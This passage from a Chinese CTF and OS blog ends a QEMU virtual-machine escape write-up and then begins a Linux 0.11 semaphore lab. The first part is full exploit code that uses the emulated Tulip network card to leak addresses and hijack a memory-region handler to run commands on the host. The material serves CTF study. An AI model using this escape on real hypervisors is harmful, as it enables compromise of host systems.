class="keyword">int</span> rx_len1, rx_len2;</span><br><span class="line">    rx_len1 = <span class="number">0x400</span>;</span><br><span class="line">    rx_len2 = <span class="number">0</span>;</span><br><span class="line">    rx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>); <span class="comment">// RDES0_OWN</span></span><br><span class="line">    rx_desc-&gt;buf_addr1  = gva_to_gpa(recv_buf);</span><br><span class="line">    rx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    rx_desc-&gt;control    = rx_len2 | rx_len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set rx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> rx_desc_gpa = gva_to_gpa(rx_desc);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] rx_desc_gpa: 0x%lx\n&quot;</span>, rx_desc_gpa);</span><br><span class="line">    pmio_writel(CSR(<span class="number">3</span>), rx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> &#123;</span>                   <span class="comment">// control the following fields in TULIPState</span></span><br><span class="line">        <span class="keyword">int</span> tx_frame_len;</span><br><span class="line">        <span class="keyword">int</span> rx_frame_len;</span><br><span class="line">        <span class="keyword">int</span> rx_frame_size;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint32_t</span> rx_status;</span><br><span class="line">        <span class="keyword">uint8_t</span> filter[<span class="number">16</span>][<span class="number">6</span>];</span><br><span class="line">    &#125;;</span><br><span class="line">    len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">    oob_data-&gt;tx_frame_len = <span class="number">0x800</span> - len1;</span><br><span class="line">    oob_data-&gt;rx_frame_len = <span class="number">0x900</span>;</span><br><span class="line">    oob_data-&gt;rx_frame_size = <span class="number">2048</span>*<span class="number">2</span> + <span class="number">0x900</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff</span></span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">    tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">    tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">    tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set tx descriptor</span></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] leak\n&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *cur = (<span class="keyword">char</span> *)recv_buf;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">50</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0x%016lx 0x%016lx\n&quot;</span>, *(<span class="keyword">size_t</span> *)cur, *(<span class="keyword">size_t</span> *)(cur+<span class="number">8</span>));</span><br><span class="line">        cur += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    cur = (<span class="keyword">char</span> *)recv_buf;</span><br><span class="line">    <span class="keyword">uint64_t</span> qemu_base = ((<span class="keyword">uint64_t</span> *)cur)[<span class="number">0x1d</span>] - <span class="number">0x755f9f</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = ((<span class="keyword">uint64_t</span> *)cur)[<span class="number">22</span>] - <span class="number">0xe11380</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> qemu_plt_system = qemu_base+<span class="number">2859620</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> frame_base = heap_base+<span class="number">0xe0fcf0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] continue...\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] qemu_base: 0x%lx\n&quot;</span>, qemu_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] heap_base: 0x%lx\n&quot;</span>, heap_base);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage2\n&quot;</span>); &#123;</span><br><span class="line">        len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CSR5_TS_SUSPENDED</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line"></span><br><span class="line">        len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">        oob_data-&gt;tx_frame_len = <span class="number">-0x3350</span> - <span class="number">0x70</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_len = <span class="number">0</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff </span></span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">uint64_t</span> *binsh = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        binsh[<span class="number">0</span>] = <span class="number">7449354444534473059</span>; <span class="comment">// catflag</span></span><br><span class="line">        binsh[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">        len1 = <span class="number">16</span>;</span><br><span class="line">        len2 = <span class="number">0</span>;</span><br><span class="line">        tx_desc-&gt;status = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1 = gva_to_gpa(binsh);</span><br><span class="line">        tx_desc-&gt;buf_addr2 = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// now control MemoryRegion.ops</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] enter stage3\n&quot;</span>); &#123;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">0</span>] = qemu_plt_system;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">1</span>] = qemu_plt_system;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">4</span>] = <span class="number">2</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">5</span>] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">6</span>] = <span class="number">0</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">7</span>] = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">8</span>] = <span class="number">0x0000000400000004</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">9</span>] = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">        ((<span class="keyword">uint64_t</span> *)buf)[<span class="number">11</span>] = <span class="number">0</span>;</span><br><span class="line">        len1 = <span class="number">0x400</span> &lt;&lt; <span class="number">0</span>;</span><br><span class="line">        len2 = <span class="number">0</span> &lt;&lt; <span class="number">11</span>;</span><br><span class="line">        tx_desc-&gt;status = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">29</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1 = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2 = <span class="number">0x180</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] desc: 0x%x\n&quot;</span>, tx_desc-&gt;buf_addr1);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">uint64_t</span> tx_desc_gpa = gva_to_gpa(tx_desc);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] tx_desc_gpa: 0x%lx\n&quot;</span>, tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// CSR5_TS_SUSPENDED</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">6</span>), <span class="number">1u</span> &lt;&lt; <span class="number">13</span>); <span class="comment">// CSR6_ST</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] fill tx_frame\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(buf);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// tulip_tx: tulip_receive(s, s-&gt;tx_frame, s-&gt;tx_frame_len);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] clean CSR5\n&quot;</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">5</span>), <span class="number">0xffffffff</span>);</span><br><span class="line">        </span><br><span class="line">        len1 = <span class="keyword">sizeof</span>(struct oob_data);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">oob_data</span> *<span class="title">oob_data</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct oob_data));</span><br><span class="line">        oob_data-&gt;tx_frame_len = <span class="number">-0x2a28</span><span class="number">-0x70</span>;  <span class="comment">// now points to the MemoryRegion.ops</span></span><br><span class="line">        oob_data-&gt;rx_frame_len = <span class="number">0</span>;</span><br><span class="line">        oob_data-&gt;rx_frame_size = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++) &#123;          <span class="comment">// bypass some stuff </span></span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">0</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">1</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">2</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">3</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">4</span>] = <span class="number">0xff</span>;</span><br><span class="line">            oob_data-&gt;filter[i][<span class="number">5</span>] = <span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(oob_data);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// set tx descriptor</span></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] hijack ops\n&quot;</span>);</span><br><span class="line">        <span class="keyword">uint64_t</span> *fake_memory_region_ops = (<span class="keyword">uint64_t</span> *)<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line">        fake_memory_region_ops[<span class="number">0</span>] = frame_base;</span><br><span class="line">        len1 = <span class="number">8</span>;</span><br><span class="line">        len2 = <span class="number">0</span>;</span><br><span class="line">        tx_desc-&gt;status     = (<span class="number">1UL</span> &lt;&lt; <span class="number">31</span>) | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        tx_desc-&gt;buf_addr1  = gva_to_gpa(fake_memory_region_ops);</span><br><span class="line">        tx_desc-&gt;buf_addr2  = <span class="number">0x180</span>;</span><br><span class="line">        tx_desc-&gt;control    = len2 | len1 | (<span class="number">1UL</span> &lt;&lt; <span class="number">24</span>);</span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// trigger the ops.write</span></span><br><span class="line">        pmio_writel(CSR(<span class="number">4</span>), tx_desc_gpa);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>刚刚入门 qemu 逃逸，理解并调试了下别人的 exp（本题目没有移除调试符号，调试起来还是很轻松的）</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/05/HIT-OSLab5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/11/05/HIT-OSLab5/" class="post-title-link" itemprop="url">HIT-OSLab5</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-11-05 00:59:20 / Modified: 01:00:02" itemprop="dateCreated datePublished" datetime="2023-11-05T00:59:20+08:00">2023-11-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>8.2k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>7 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>HIT-OSLab5</strong></p>
<p>实验目的：</p>
<ul>
<li>加深对进程同步与互斥概念的认识</li>
<li>掌握信号量的实现原理两种（不同的实现方式）</li>
<li>掌握信号量的使用，并应用它解决生产者-消费者问题</li>
</ul>
<p>实验内容：</p>
<ul>
<li>在 Linux-0.11 中实现信号量，具体来说就是实现如下4个系统调用：<ul>
<li>sys_sem_open：用于打开一个信号量文件描述符</li>
<li>sys_sem_wait：等待一个信号量的释放 </li>
<li>sys_sem_post：释放一个信号量 </li>
<li>sys_sem_unlink：删除一个信号量 </li>
</ul>
</li>
<li>在 Ubuntu 下编写程序，用已经实现的信号量解决生产者-消费者问题</li>
</ul>
<p><strong>实验过程</strong></p>
<p>进程同步与互斥是操作系统中实现进程间通信和同步的基本机制，它们的主要目的是确保在多个进程之间共享资源时，能够正确地保持同步状态，避免竞争条件和数据不一致等问题</p>
<ul>
<li>进程同步是指在多个进程之间同步数据访问，确保同一时刻只有一个进程可以访问共享资源</li>
<li>进程互斥是指在多个进程之间同步对共享资源的互斥访问，确保同一时刻只有一个进程可以访问共享资源</li>
</ul>
<p>进程同步和互斥可以通过不同的同步原语来实现，例如：锁(Lock)、信号量(Semaphore)、条件变量(ConditionVariable)</p>
<ul>
<li>锁：有两种实现方式，基于原子操作和基于信号量</li>
<li>信号量：核心结构为一个整数和一个等待队列</li>
<li>条件变量：在满足特定条件时通知进程，使其可以访问共享资源</li>
</ul>
<p>PV 操作是指进程之间的同步原语，用于实现进程之间的同步和通信（PV 操作是 Posix 信号量的一种实现方式）</p>
<ul>
<li>P操作：信号量 —，判断是不是要阻塞</li>
<li>V操作：信号量 ++，判断是不是要唤醒 </li>
</ul>
<p>PV 操作的实现需要保证操作的原子性，而保证原子性有很多方法：</p>
<ul>
<li>这里不采用软件保护法（比如：轮换法 \ 标记法 \ peterson 算法 \ Lamport 面包店算法），而是采用硬件保护法</li>
<li>由于是 linux-0.11 运行在单核 cpu 上（Bochs 虚拟机提供单核 cpu 环境），所以可以采用简单的开关中断的方法</li>
<li>如果是多 cpu 环境，就使用硬件原子指令保护法（用硬件原子指令操控一个 mutex 信号量来保护临界区）</li>
</ul>
<p>开关中断的实现需要依赖如下函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> sti() __asm__ (<span class="meta-string">&quot;sti&quot;</span>::) <span class="comment">// 开中断</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> cli() __asm__ (<span class="meta-string">&quot;cli&quot;</span>::) <span class="comment">// 关中断</span></span></span><br></pre></td></tr></table></figure>
<p>基于 PV 操作实现信号量的模板如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">P()&#123; </span><br><span class="line">    cli();</span><br><span class="line">    value--; <span class="comment">// 信号量--</span></span><br><span class="line">    <span class="keyword">if</span>(value &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        schedual(); <span class="comment">// 调度其他进程</span></span><br><span class="line">    &#125;</span><br><span class="line">    sti();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">V()&#123; </span><br><span class="line">    cli();</span><br><span class="line">    value++; <span class="comment">// 信号量++</span></span><br><span class="line">    <span class="keyword">if</span>(value &lt;= <span class="number">0</span>)&#123;</span><br><span class="line">        wakeup(); <span class="comment">// 唤醒等待队列中的进程</span></span><br><span class="line">    &#125;</span><br><span class="line">    sti();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>信号量 &gt; 0 时，信号量代表临界区中拥有的资源数目</li>
<li>信号量 &lt; 0 时，信号量代表等待队列中的进程数目</li>
</ul>
<p>本实验要求我们实现信号量，定义信号量的数据结构如下：（在 <code>/include/unistd.h</code> 中）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> QUE_LEN 16</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore_queue</span>&#123;</span></span><br><span class="line">	<span class="keyword">int</span> front;</span><br><span class="line">	<span class="keyword">int</span> rear;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">wait_tasks</span>[<span class="title">QUE_LEN</span>];</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">semaphore_queue</span> <span class="title">sem_queue</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore_t</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> value; <span class="comment">/* 信号量计数器 */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>]; <span class="comment">/* 信号量名称 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semaphore_queue</span> <span class="title">wait_queue</span>;</span> <span class="comment">/* 等待队列 */</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">semaphore_t</span> <span class="title">sem_t</span>;</span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>wait_tasks[QUE_LEN]</code> 为静态列表，索引 front / rear 分别表示其头部 / 尾部的位置</li>
</ul>
<p>首先我们需要添加信号量的系统调用号：（在 <code>/include/unistd.h</code> 中）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sem_open 	72</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sem_wait	73</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sem_post	74</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_sem_unlink	75</span></span><br></pre></td></tr></table></figure>
<ul>
<li>需要注意的是：这里同时需要修改 <code>hdc-0.11.img</code> 中的 <code>hdc/usr/include/unistd.h</code> 文件，如果想在虚拟机中使用 gcc 编译的话，会导入虚拟机 <code>hdc/usr/include/</code> 中的文件为头文件</li>
</ul>
<p>接着修改系统调用号的总数：（在 <code>/kernel/system_call.s</code> 中）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nr_system_calls = 76</span><br></pre></td></tr></table></figure>
<p>最后添加新的系统调用定义：（在 <code>/include/linux/sys.h</code> 中）</p>
